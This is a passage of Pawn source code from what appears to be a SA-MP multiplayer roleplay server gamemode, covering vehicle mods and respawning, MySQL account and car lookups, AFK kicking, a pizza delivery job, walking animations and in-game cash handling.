	if(CarInfo[OwnedVeh(vehicleid)][mod5] != 0)
	{
		AddVehicleComponent(vehicleid,CarInfo[OwnedVeh(vehicleid)][mod5]);
	}
	if(CarInfo[OwnedVeh(vehicleid)][mod6] != 0)
	{
		AddVehicleComponent(vehicleid,CarInfo[OwnedVeh(vehicleid)][mod6]);
	}
	if(CarInfo[OwnedVeh(vehicleid)][mod7] != 0)
	{
		AddVehicleComponent(vehicleid,CarInfo[OwnedVeh(vehicleid)][mod7]);
	}
	if(CarInfo[OwnedVeh(vehicleid)][mod8] != 0)
	{
		AddVehicleComponent(vehicleid,CarInfo[OwnedVeh(vehicleid)][mod8]);
	}
	if(CarInfo[OwnedVeh(vehicleid)][mod9] != 0)
	{
		AddVehicleComponent(vehicleid,CarInfo[OwnedVeh(vehicleid)][mod9]);
	}
	if(CarInfo[OwnedVeh(vehicleid)][mod10] != 0)
	{
		AddVehicleComponent(vehicleid,CarInfo[OwnedVeh(vehicleid)][mod10]);
	}
	if(CarInfo[OwnedVeh(vehicleid)][mod11] != 0)
	{
		AddVehicleComponent(vehicleid,CarInfo[OwnedVeh(vehicleid)][mod11]);
	}
	if(CarInfo[OwnedVeh(vehicleid)][mod12] != 0)
	{
		AddVehicleComponent(vehicleid,CarInfo[OwnedVeh(vehicleid)][mod12]);
	}
	if(CarInfo[OwnedVeh(vehicleid)][mod13] != 0)
	{
		AddVehicleComponent(vehicleid,CarInfo[OwnedVeh(vehicleid)][mod13]);
	}
	if(CarInfo[OwnedVeh(vehicleid)][mod14] != 0)
	{
		AddVehicleComponent(vehicleid,CarInfo[OwnedVeh(vehicleid)][mod14]);
	}
	if(CarInfo[OwnedVeh(vehicleid)][mod15] != 0)
	{
		AddVehicleComponent(vehicleid,CarInfo[OwnedVeh(vehicleid)][mod15]);
	}
	if(CarInfo[OwnedVeh(vehicleid)][mod16] != 0)
	{
		AddVehicleComponent(vehicleid,CarInfo[OwnedVeh(vehicleid)][mod16]);
	}
	if(CarInfo[OwnedVeh(vehicleid)][mod17] != 0)
	{
		AddVehicleComponent(vehicleid,CarInfo[OwnedVeh(vehicleid)][mod17]);
	}
	ChangeVehiclePaintjob(vehicleid, CarInfo[OwnedVeh(vehicleid)][cPaintJ]);
}

public MySQLCheckCar(carname[])
{
	new query[128],
		escstr[MAX_PLAYER_NAME];
	mysql_real_escape_string(carname, escstr);
	format(query, sizeof(query), "SELECT `ID` FROM stock WHERE `Car` = '%s'", escstr);
	mysql_query(SQL,query);
	mysql_store_result();
	if (mysql_num_rows()==0)
	{
	    mysql_free_result();
		return 0;
	}
	else
	{
		new strid[32],
			intid;
		mysql_fetch_row(strid);
		intid = strval(strid);
	    mysql_free_result();
		return intid;
	}
}

public MySQLCheckSpeed(vidd)
{
	new query[128];
	format(query, sizeof(query), "SELECT `speed` FROM stock WHERE `vid` = '%d'", vidd);
	mysql_query(SQL,query);
	mysql_store_result();
	if (mysql_num_rows()==0)
	{
	    mysql_free_result();
		return 0;
	}
	else
	{
		new strid[32],
			intid;
		mysql_fetch_row(strid);
		intid = strval(strid);
	    mysql_free_result();
		return intid;
	}
}

public MySQLCheckAccount(sqlplayersname[])
{
	new query[128],
		escstr[MAX_PLAYER_NAME];
	mysql_real_escape_string(sqlplayersname, escstr);
	format(query, sizeof(query), "SELECT `ID` FROM users WHERE `name` = '%s'", escstr);
	mysql_query(SQL,query);
	mysql_store_result();
	if (mysql_num_rows()==0)
	{
	    mysql_free_result();
		return 0;
	}
	else
	{
		new strid[32],
			intid;
		mysql_fetch_row(strid);
		intid = strval(strid);
	    mysql_free_result();
		return intid;
	}
}
public MySQLCheckAccount2(sqlplayersname[])
{
	new query[128],
		escstr[MAX_PLAYER_NAME];
	mysql_real_escape_string(sqlplayersname, escstr);
	format(query, sizeof(query), "SELECT `ID` FROM users2 WHERE `numewq9q5s6ad9` = '%s'", escstr);
	mysql_query(SQL,query);
	mysql_store_result();
	if (mysql_num_rows()==0)
	{
	    mysql_free_result();
		return 0;
	}
	else
	{
		new strid[32],
			intid;
		mysql_fetch_row(strid);
		intid = strval(strid);
	    mysql_free_result();
		return intid;
	}
}
public CheckAFK()
{
	foreach(Player,k)
	{
    	GetPlayerPos(k, PlayerPosii[k][0], PlayerPosii[k][1], PlayerPosii[k][2]);
		if(PlayerPosii[k][0] == PlayerPosii[k][3] && PlayerPosii[k][1] == PlayerPosii[k][4] && PlayerPosii[k][2] == PlayerPosii[k][5])
		{
        	IsPlayerAFK[k]++;
		}
		else
		{
	    	IsPlayerAFK[k] = 0;
		}
		PlayerPosii[k][3] = PlayerPosii[k][0];
		PlayerPosii[k][4] = PlayerPosii[k][1];
		PlayerPosii[k][5] = PlayerPosii[k][2];
		if(PlayerInfo[k][pWantedLevel] >= 1)
		{
			new str2[256];
			format(str2,sizeof(str2),"{FF6600}Wanted Level: %d",PlayerInfo[k][pWantedLevel]);
			UpdateDynamic3DTextLabelText(WantedScris[k], COLOR_SERVER, str2);
		}
	}
	return 1;
}

public CountDownCheck3(playerid)
{
	GameTextForPlayer(playerid, "~g~3", 1000, 3);
	PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
    SetTimerEx("CountDownCheck2", 1000, 0, "i", playerid);
    return 1;
}

public CountDownCheck2(playerid)
{
	GameTextForPlayer(playerid, "~g~2", 1000, 3);
	PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
    SetTimerEx("CountDownCheck1", 1000, 0, "i", playerid);
    return 1;
}

public CountDownCheck1(playerid)
{
	GameTextForPlayer(playerid, "~g~1", 1000, 3);
	PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
 	SetTimerEx("CountDownCheckGo", 1000, 0, "i", playerid);
 	return 1;
}

public Livrarepizza1(playerid)
{
    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && workdeja[playerid] == 1 && PizzaCP[playerid] == 0)
	{
	    SetTimerEx("Livrarepizza2", 30000, 0, "i", playerid);
	    SCM(playerid, -1, "{CC6600}(!)You have 30 seconds available to order key [/pizza].");
	}
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	{
        SetTimerEx("Livrarepizza2", 30000, 0, "i", playerid);
	    SCM(playerid, -1, "{CC6600}(!)You have 30 seconds available to return the scooter.");
	}
	return 1;
}

public Livrarepizza2(playerid)
{
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && workdeja[playerid] == 1 && PizzaCP[playerid] == 0)
	{
	    DestroyVehicle(pizzacar[playerid]);
	    workdeja[playerid] = 0;
	    SCM(playerid, -1, "{990000}job failed. You did not type the command [/pizza] at time.");
	    DisablePlayerRaceCheckpoint(playerid);
		pizzaj[playerid] = 0;
		pizzatime[playerid] = 0;
		failpizza[playerid] = -1;
		PizzaCP[playerid] = 0;
		pizzaprize[playerid] = 0;
		pizzacar[playerid] = -1;
	}
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT && workdeja[playerid] == 1)
	{
	    workdeja[playerid] = 0;
	    SCM(playerid, -1, "{990000}Job failed. Not you back in time on scooter.");
	    DestroyVehicle(pizzacar[playerid]);
	    DisablePlayerRaceCheckpoint(playerid);
		pizzaj[playerid] = 0;
		pizzatime[playerid] = 0;
		failpizza[playerid] = -1;
		PizzaCP[playerid] = 0;
		pizzaprize[playerid] = 0;
		pizzacar[playerid] = -1;
	}
	return 1;
}

public CountDownCheckGo(playerid)
{
	GameTextForPlayer(playerid, "~r~GO ~y~GO ~b~GO", 3000, 3);
	PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
	return 1;
}

public CountDownFinalize()
{
	countdown = 0;
	return 1;
}

public Vendingg(playerid)
{
	KillTimer(vendi[playerid]);
	Vending[playerid] = 0;
	return 1;
}

public Vendingg2(playerid)
{
	new Float:health;
	KillTimer(vendi2[playerid]);
	GetPlayerHealthEx(playerid,health);
	ClearAnimations(playerid);
	ApplyAnimation(playerid, "VENDING", "VEND_Drink_P", 4.0, 0, 0, 0, 0, 0);
	if(health >= 75)
	{
	    SetPlayerHealthEx(playerid, 100);
	}
	else
	{
	    SetPlayerHealthEx(playerid, health+25);
	}
	return 1;
}

public AttachTrailerrr(playerid)
{
	new Float:pX,
		Float:pY,
		Float:pZ;
	GetPlayerPos(playerid,pX,pY,pZ);
	new Float:vX,
		Float:vY,
		Float:vZ;
	GetVehiclePos(viddd[playerid],vX,vY,vZ);
	if ((floatabs(pX-vX)<100.0)&&(floatabs(pY-vY)<100.0)&&(floatabs(pZ-vZ)<100.0)&&(viddd[playerid]!=GetPlayerVehicleID(playerid)))
	{
		AttachTrailerToVehicle(viddd[playerid],GetPlayerVehicleID(playerid));
	}
	return 1;
}
public aimback(playerid)
{
    SetPlayerPosEx(playerid,Aimx[playerid],Aimy[playerid],Aimz[playerid]);
	return 1;
}

public IdleKick()
{
	if(kickafk == 1)
	{
	 	foreach(Player,i)
		{
	        if(PlayerInfo[i][pSleeping] == 0)
			{
			    if(PlayerInfo[i][pAdmin] < 1)
			    {
					GetPlayerPos(i, PlayerPos[i][0], PlayerPos[i][1], PlayerPos[i][2]);
					if(PlayerPos[i][0] == PlayerPos[i][3] && PlayerPos[i][1] == PlayerPos[i][4] && PlayerPos[i][2] == PlayerPos[i][5])
					{
						new plname[64],
							string[128];
						GetPlayerName(i, plname, sizeof(plname));
						format(string, sizeof(string), "%s was kicked by AdmBot for being AFK for more than 30 minutes.", plname);
						SendClientMessageToAll(COLOR_ERROR, string);
						KickEx(i);
					}
					PlayerPos[i][3] = PlayerPos[i][0];
					PlayerPos[i][4] = PlayerPos[i][1];
					PlayerPos[i][5] = PlayerPos[i][2];
				}
			}
		}
	}
	return 1;
}

forward WalkAnim(playerid);
public  WalkAnim(playerid)
{
	new keys, updown, leftright;
	GetPlayerKeys(playerid,keys,updown,leftright);
	if (GetPlayerWalkingStyle(playerid) == WALK_NORMAL)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_player",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_player",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_PED)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_civi",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_civi",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
 	else if (GetPlayerWalkingStyle(playerid) == WALK_GANGSTA)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_gang1",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_gang1",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_GANGSTA2)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_gang2",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_gang2",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_OLD)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_old",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_old",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_FAT_OLD)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_fatold",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_fatold",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_FAT)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_fat",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_fat",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_LADY)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WOMAN_walknorm",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WOMAN_walknorm",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_LADY2)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WOMAN_walkbusy",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WOMAN_walkbusy",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_WHORE)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WOMAN_walkpro",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WOMAN_walkpro",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_WHORE2)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WOMAN_walksexy",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WOMAN_walksexy",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_DRUNK)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_drunk",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_drunk",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_BLIND)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","Walk_Wuzi",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","Walk_Wuzi",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	return 1;
}

stock SetPlayerWalkingStyle(playerid, style)
{
	WalkStyle[playerid] = style;
}

stock GetPlayerWalkingStyle(playerid)
{
	return WalkStyle[playerid];
}

stock GetNoOfPlayersInVeh(vehicleid)
{
    new x;
    for ( new i; i != MAX_PLAYERS; ++i )
    {
        if ( GetPlayerVehicleID ( i ) != vehicleid ) continue;
        x += 1;
    }
    return x;
}

stock YoutubeStreamForPlayer(playerid, vlink[])
{
    new videoid[128],
		mp3link[128];
    strmid(videoid,vlink,strfind(vlink,"v=")+2,strfind(vlink,"v=")+15);
    format(mp3link,128,"http://admigos.net/youtube.php?videoid=%s",videoid);
    PlayAudioStreamForPlayersInCar(GetPlayerVehicleID(playerid),mp3link);
	return 1;
}

function GetPlayers(option[]) {
	new nrr = 0, id = 1002;
	if(IsNumeric(option)) {
		new i = strval(option);
		if(IsPlayerConnected(i))
		id = i;
		else id = INVALID_PLAYER_ID;
	} else {
		foreach(Player, i) {
			if(strfind(GetName(i), option, true) != -1)
			{
				nrr ++;
			}
		}
		if(nrr > 10) id = 1000;
		if(nrr == 0) id = INVALID_PLAYER_ID;
		if(nrr > 1 && nrr <= 10) id = 1001;

		foreach(Player, i) {
			if(strfind(GetName(i), option, true) != -1 && id == 1002)
			{
				id = i;
			}
		}
	}
	return id;
}
stock InvalidPlayer(playerid) return SendClientMessage(playerid, COLOR_ERROR, "Invalid Player ID/Name.");
stock ToManyResults(playerid) return SendClientMessage(playerid, COLOR_ERROR, "Too many results for this search.");
stock ShowResults(playerid, option[])
{
	new string[128];
	SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Too many results for this search. Try one of these:");
	foreach(Player, i)
	{
		if(strfind(GetName(i), option, true) != -1)
		{
			format(string, sizeof(string), "{C1F589}(%d) %s", i, GetName(i));
			SendClientMessage(playerid, COLOR_SERVER, string);
		}
	}
	return 1;
}

public DrugEffectGone(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    if(UsingDrugs[playerid] == 1)
	    {
            UsingDrugs[playerid] = 0;
			ClearAnimations(playerid);
			SetPlayerDrunkLevel (playerid, 0);
            PlayerStoned[playerid] = 0;
            KillTimer(drug[playerid]);
		}
	}
	return 1;
}

stock GivePlayerCash(playerid, money) 
{
	new sumabani = Cash[playerid] + money;
	if(money < 1400000000 && sumabani < 1400000000)
	{
		Cash[playerid] += money;
		return 1;
	}
	if(Cash[playerid] >= 1000000000)
	{
		addVV(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], money);
		return 1;
	}
	if(sumabani >= 1000000000)
	{
		new calcul = 1000000000-Cash[playerid];
		if(calcul > 0)
		{
			if(sumabani > calcul)
			{
				new calcul2 = sumabani-Cash[playerid];
				if(calcul2 > 0)
				{
					Cash[playerid] += calcul2;
					money -= calcul2;
					if(money > 0)
					{
						addVV(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], money);
					}
				}
			}
		}
		else
		{
			addVV(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], money);
		}
		// EX - ALGORITM
		// #1 - v1: 1.000.000.000 | v2: 1.000.000.000 | suma = 10.000
		// #2 - v2 > v1 = raspuns = pozitiv;
		// #3 - v1 - v2 = 1.000.000.000 = suma acceptata (mana);
		// #4 - calcul = reset, rest > 0 = raspuns afirmativ.
		// #5 - calcul < 1 = adaugare bani in banca.
		// #6 - v1 > calcul = calcul2 = v1-v2
		// #7 - calcul2 = suma intrare bani in mana.
		// #8 - Cash + calcul2 = suma maxima;
		// #9 - money - calcul2 = suma intrare banca.
		// #10 - money > 0 = bani intra in banca.
		
	}
	else
	{
		Cash[playerid] += money;
	}
	return 1;
}	
stock GetPlayerCash(playerid) return Cash[playerid];
stock ResetPlayerCash(playerid) return Cash[playerid] = 0;

stock NumeFactiune(id)
{
	new ftexst[35];
	switch(id)
	{
		case 0: ftexst = "Civilian";
		case 1: ftexst = "Edare Police";
		case 2: ftexst = "Police Federal";
		case 3: ftexst = "GardMeli";
		case 4: ftexst = "Los Aztecas";
		case 5: ftexst = "Yakuza Family";
		case 6: ftexst = "Los Vagos";
		case 8: ftexst = "Las Venturas Police Department";
		case 9: ftexst = "KhabarNegar";
		case 10: ftexst = "Ballas";
		case 11: ftexst = "Hitman Agency";
		case 12: ftexst = "Edare Morabigari Va Amuzesh";
		case 13: ftexst = "Ajans";
		case 14: ftexst = "Pezeshk";
		case 15: ftexst = "San Fierro Police Departament";
	}
	return ftexst;
}

stock CalculeazaTimp(secunde)
{
	new time = secunde;
	new ora = time/3600;
	time = time%3600;
	new minute = time/60;
	time = time%60;
	new secunde2 = time;
	new string[10];
	format(string,sizeof(string),"%02d:%02d:%02d",ora,minute,secunde2);
	return string;
}

stock CalculeazaTimp2(secunde)
{
	new time = secunde;
	time = time%3600;
	new minute = time/60;
	time = time%60;
	new secunde2 = time;
	new string[10];
	format(string,sizeof(string),"%02d:%02d",minute,secunde2);
	return string;
}

stock RespawnPVeh(vid,playerid)
{
	new masinalui,carid;
	if(vid == personalcar[0][playerid])
	{
	    vehEngine[personalcar[0][playerid]] = 0;
		DestroyVehicle(personalcar[0][playerid]);
		OwnedVeh(personalcar[0][playerid]) = 0;
		carid = PlayerInfo[playerid][pPcarkey];
		Gas[personalcar[0][playerid]] = CarInfo[carid][cGas];
		masinalui = 1;
	}
	else if(vid == personalcar[1][playerid])
	{
	    vehEngine[personalcar[1][playerid]] = 0;
		DestroyVehicle(personalcar[1][playerid]);
		OwnedVeh(personalcar[1][playerid]) = 0;
		carid = PlayerInfo[playerid][pmotokey];
		Gas[personalcar[1][playerid]] = CarInfo[carid][cGas];
		masinalui = 2;
	}
	else if(vid == personalcar[2][playerid])
	{
	    vehEngine[personalcar[2][playerid]] = 0;
		DestroyVehicle(personalcar[2][playerid]);
		OwnedVeh(personalcar[2][playerid]) = 0;
		carid = PlayerInfo[playerid][pprcarkey];
		Gas[personalcar[2][playerid]] = CarInfo[carid][cGas];
		masinalui = 3;
	}
	else if(vid == personalcar[3][playerid])
	{
	    vehEngine[personalcar[3][playerid]] = 0;
		DestroyVehicle(personalcar[3][playerid]);
		OwnedVeh(personalcar[3][playerid]) = 0;
		carid = PlayerInfo[playerid][pprcarkey2];
		Gas[personalcar[3][playerid]] = CarInfo[carid][cGas];
		masinalui = 4;
	}
	else if(vid == personalcar[4][playerid])
	{
	    vehEngine[personalcar[4][playerid]] = 0;
		DestroyVehicle(personalcar[4][playerid]);
		OwnedVeh(personalcar[4][playerid]) = 0;
		carid = PlayerInfo[playerid][pPPluscarkey];
		Gas[personalcar[4][playerid]] = CarInfo[carid][cGas];
		masinalui = 5;
	}
	else if(vid == personalcar[5][playerid])
	{
	    vehEngine[personalcar[5][playerid]] = 0;
		DestroyVehicle(personalcar[5][playerid]);
		OwnedVeh(personalcar[5][playerid]) = 0;
		carid = PlayerInfo[playerid][pPPluscarkey2];
		Gas[personalcar[5][playerid]] = CarInfo[carid][cGas];
		masinalui = 6;
	}
    else if(vid == personalcar[6][playerid])
	{
	    vehEngine[personalcar[6][playerid]] = 0;
		DestroyVehicle(personalcar[6][playerid]);
		OwnedVeh(personalcar[6][playerid]) = 0;
		carid = PlayerInfo[playerid][pCarkey7];
		Gas[personalcar[6][playerid]] = CarInfo[carid][cGas];
		masinalui = 7;
	}
	else if(vid == personalcar[7][playerid])
	{
	    vehEngine[personalcar[7][playerid]] = 0;
		DestroyVehicle(personalcar[7][playerid]);
		OwnedVeh(personalcar[7][playerid]) = 0;
		carid = PlayerInfo[playerid][pCarkey8];
		Gas[personalcar[7][playerid]] = CarInfo[carid][cGas];
		masinalui = 8;
	}
	else if(vid == personalcar[8][playerid])
	{
	    vehEngine[personalcar[8][playerid]] = 0;
		DestroyVehicle(personalcar[8][playerid]);
		OwnedVeh(personalcar[8][playerid]) = 0;
		carid = PlayerInfo[playerid][pCarkey9];
		Gas[personalcar[8][playerid]] = CarInfo[carid][cGas];
		masinalui = 9;
	}
	else if(vid == personalcar[9][playerid])
	{
	    vehEngine[personalcar[9][playerid]] = 0;
		DestroyVehicle(personalcar[9][playerid]);
		OwnedVeh(personalcar[9][playerid]) = 0;
		carid = PlayerInfo[playerid][pCarkey10];
		Gas[personalcar[9][playerid]] = CarInfo[carid][cGas];
		masinalui = 10;
	}
	else if(vid == personalcar[10][playerid])
	{
	    vehEngine[personalcar[10][playerid]] = 0;
		DestroyVehicle(personalcar[10][playerid]);
		OwnedVeh(personalcar[10][playerid]) = 0;
		carid = PlayerInfo[playerid][pCarkey11];
		Gas[personalcar[10][playerid]] = CarInfo[carid][cGas];
		masinalui = 11;
	}
	else if(vid == personalcar[11][playerid])
	{
	    vehEngine[personalcar[11][playerid]] = 0;
		DestroyVehicle(personalcar[11][playerid]);
		OwnedVeh(personalcar[11][playerid]) = 0;
		carid = PlayerInfo[playerid][pCarkey12];
		Gas[personalcar[11][playerid]] = CarInfo[carid][cGas];
		masinalui = 12;
	}
	else if(vid == personalcar[12][playerid])
	{
	    vehEngine[personalcar[12][playerid]] = 0;
		DestroyVehicle(personalcar[12][playerid]);
		OwnedVeh(personalcar[12][playerid]) = 0;
		carid = PlayerInfo[playerid][pCarkey13];
		Gas[personalcar[12][playerid]] = CarInfo[carid][cGas];
		masinalui = 13;
	}
	else if(vid == personalcar[13][playerid])
	{
	    vehEngine[personalcar[13][playerid]] = 0;
		DestroyVehicle(personalcar[13][playerid]);
		OwnedVeh(personalcar[13][playerid]) = 0;
		carid = PlayerInfo[playerid][pCarkey14];
		Gas[personalcar[13][playerid]] = CarInfo[carid][cGas];
		masinalui = 14;
	}
	else if(vid == personalcar[14][playerid])
	{
	    vehEngine[personalcar[14][playerid]] = 0;
		DestroyVehicle(personalcar[14][playerid]);
		OwnedVeh(personalcar[14][playerid]) = 0;
		carid = PlayerInfo[playerid][pCarkey15];
		Gas[personalcar[14][playerid]] = CarInfo[carid][cGas];
		masinalui = 15;
	}
	new car = CreateVehicle(CarInfo[carid][cModel],CarInfo[carid][cLocationx],CarInfo[carid][cLocationy],CarInfo[carid][cLocationz],CarInfo[carid][cAngle],CarInfo[carid][cColorOne],CarInfo[carid][cColorTwo],500000);
	SetVehicleNumberPlate(car, CarInfo[carid][cLicense]);
	SetVehicleHealth(car, CarInfo[carid][cHP]);
	UpdateVehicleDamageStatus(car, CarInfo[carid][cDamage1], CarInfo[carid][cDamage2], CarInfo[carid][cDamage3], CarInfo[carid][cDamage4]);
	new engine,lights,alarm,doors,bonnet,boot,objective;
	if(CarInfo[carid][cLock] == 1)
	{
		GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(car,engine,lights,alarm,1,bonnet,boot,objective);
	}
	if(CarInfo[carid][cLock] == 0)
	{
		GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(car,engine,lights,alarm,0,bonnet,boot,objective);
	}
	OwnedVeh(car) = carid;
	if(masinalui == 1)
		personalcar[0][playerid] = car;
    if(masinalui == 2)
		personalcar[1][playerid] = car;
    if(masinalui == 3)
		personalcar[2][playerid] = car;
    if(masinalui == 4)
		personalcar[3][playerid] = car;
    if(masinalui == 5)
		personalcar[4][playerid] = car;
    if(masinalui == 6)
		personalcar[5][playerid] = car;
    if(masinalui == 7)
		personalcar[6][playerid] = car;
    if(masinalui == 8)
		personalcar[7][playerid] = car;
    if(masinalui == 9)
		personalcar[8][playerid] = car;
	if(masinalui == 10)
		personalcar[9][playerid] = car;
	if(masinalui == 11)
		personalcar[10][playerid] = car;
	if(masinalui == 12)
		personalcar[11][playerid] = car;
	if(masinalui == 13)
		personalcar[12][playerid] = car;
	if(masinalui == 14)
		personalcar[13][playerid] = car;
	if(masinalui == 15)
		personalcar[14][playerid] = car;
	SwitchKey[playerid] = 1;
	ModVehicle(car);
	return 1;
}
stock DestroyPVehs(playerid)
{
    if(personalcar[0][playerid] > 0)
	{
		vehEngine[personalcar[0][playerid]] = 0;
